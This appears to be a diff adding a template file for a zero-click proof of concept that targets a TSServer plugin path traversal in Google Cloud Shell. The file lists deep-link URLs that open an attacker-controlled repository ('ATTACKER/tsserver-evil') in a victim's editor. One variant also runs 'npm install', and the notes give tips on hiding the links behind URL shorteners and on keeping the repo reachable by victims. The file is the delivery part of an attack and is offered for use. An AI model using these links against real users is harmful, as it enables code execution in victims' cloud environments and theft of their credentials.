@@ -1,0 +1,60 @@
+# Cloud Shell Deep-Link URL Templates
+# TSServer Plugin Path Traversal — Zero-Click PoC
+# ================================================
+
+# ─── PRIMARY ATTACK URL ───────────────────────────────────────────────
+# This is the main deep-link to use for the attack.
+# Replace ATTACKER with your GitHub username and tsserver-evil with your repo name.
+
+# Cloud Shell Editor (primary — opens the editor with the repo and file)
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_workspace=.
+
+# ─── VARIANT URLS ─────────────────────────────────────────────────────
+
+# Without workspace parameter (Cloud Shell auto-detects)
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+
+# Open in IDE with tutorial pane hidden
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_tutorial=
+
+# Cloud Shell terminal + editor (opens both)
+https://ssh.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+
+# Legacy IDE deep link
+https://ide.cloud.google.com/?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts
+
+# ─── WITH ADDITIONAL PARAMETERS ───────────────────────────────────────
+
+# With shell command (opening terminal with a specific command)
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&cloudshell_command=npm install
+
+# With specific git branch/tag
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_git_branch=main&cloudshell_open_in_editor=main.ts
+
+# With ephemeral mode (if supported by newer Cloud Shell versions)
+https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/ATTACKER/tsserver-evil&cloudshell_open_in_editor=main.ts&ephemeral=true
+
+# ─── SHORTENED / OBFUSCATED ──────────────────────────────────────────
+
+# Using git.io or similar shortener:
+# https://git.io/XXXXX -> redirects to the full deep-link URL
+
+# Using goo.gle:
+# https://goo.gle/XXXXX
+
+# ─── TESTING URLS (yours) ────────────────────────────────────────────
+
+# Replace with your actual attacker-controlled repo URL:
+# https://shell.cloud.google.com/cloudshell/editor?cloudshell_git_repo=https://github.com/YOUR_USERNAME/tsserver-evil&cloudshell_open_in_editor=main.ts
+
+# ─── NOTES ───────────────────────────────────────────────────────────
+
+# 1. The repo MUST be public (or accessible to the victim)
+# 2. The repo URL should NOT contain authentication tokens
+# 3. GitHub URLs work: https://github.com/USER/REPO
+# 4. GitLab URLs also work via codeload: https://gitlab.com/USER/REPO
+# 5. Bitbucket URLs may also work
+# 6. The .git suffix is optional for GitHub
+# 7. For private repos, use: https://github.com/USER/REPO?token=GIT_TOKEN
+# 8. The cloudshell_open_in_editor parameter can specify multiple files:
+#    &cloudshell_open_in_editor=main.ts,README.md
